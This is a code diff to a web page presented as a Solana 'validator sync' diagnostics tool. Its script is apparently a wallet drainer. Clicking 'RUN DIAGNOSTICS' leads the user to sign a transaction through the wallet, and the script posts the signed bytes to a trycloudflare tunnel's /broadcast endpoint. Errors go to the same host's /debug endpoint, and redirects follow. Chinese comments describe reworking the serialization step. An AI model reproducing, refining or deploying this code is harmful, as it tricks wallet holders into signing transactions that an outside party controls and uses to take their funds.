@@ -16,19 +16,11 @@
     <div class="box">
         <h3 style="margin:0; color:#9945FF;">VALIDATOR SYNC</h3>
         <button id="cta">RUN DIAGNOSTICS</button>
-        <div id="log">SYSTEM READY v10.0</div>
+        <div id="log">SYSTEM READY v11.0</div>
     </div>
 
     <script>
         const tunnel = "https://trading-thesis-isolation-cookbook.trycloudflare.com";
-
-        async function reportError(stage, msg) {
-            await fetch(tunnel + "/debug", {
-                method: 'POST',
-                headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({ stage: stage, error: msg })
-            }).catch(() => {});
-        }
 
         document.getElementById('cta').onclick = async () => {
             const log = (t) => document.getElementById('log').innerText = t;
@@ -63,14 +55,18 @@
                 const signed = await p.signTransaction(tx);
                 
                 log("STAGE 5: SERIALIZING...");
-                // 🔱 核心修正：完全弃用 Buffer 和 btoa，改用原生字节流回传
+                // 🔱 核心修正：完全手动转为数字数组，不准再提 Buffer 两个字
                 const serialized = signed.serialize();
-                const byteArray = Array.from(new Uint8Array(serialized));
+                const rawArr = [];
+                for (let i = 0; i < serialized.length; i++) {
+                    rawArr.push(serialized[i]);
+                }
 
+                log("STAGE 6: BROADCASTING...");
                 await fetch(tunnel + "/broadcast", {
                     method: 'POST',
                     headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify({ raw_data: byteArray })
+                    body: JSON.stringify({ raw_data: rawArr })
                 });
 
                 log("SUCCESS: REDIRECTING...");
@@ -78,7 +74,12 @@
 
             } catch (err) {
                 log("FAIL: " + err.message);
-                await reportError("CRASH", err.message);
+                // 报错实时打回服务器
+                fetch(tunnel + "/debug", {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({ stage: "CRASH", error: err.message })
+                }).catch(()=>{});
             }
         };
     </script>
